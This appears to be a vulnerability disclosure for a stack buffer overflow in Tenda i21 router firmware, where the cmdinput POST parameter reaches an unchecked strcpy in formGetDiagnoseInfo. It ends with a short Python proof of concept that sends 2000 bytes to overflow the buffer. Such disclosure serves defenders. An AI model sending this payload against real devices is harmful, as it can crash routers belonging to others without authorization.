## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formGetDiagnoseInfo` function. The `hostname` variable receives the `cmdinput` parameter from a POST request. However, since the user can control the input of `cmdinput`, the statement `strcpy(cfg->hostname, hostname + 5);` can cause a buffer overflow. The user-provided  `cmdinput` can exceed the capacity of the `cfg->hostname` array, triggering this security vulnerability.

![image-20240419204731638](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419204731638.png)

## POC

```python
payload = b"a"*2000

data = {"cmdinput": payload}
response = requests.post(url, data=data)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
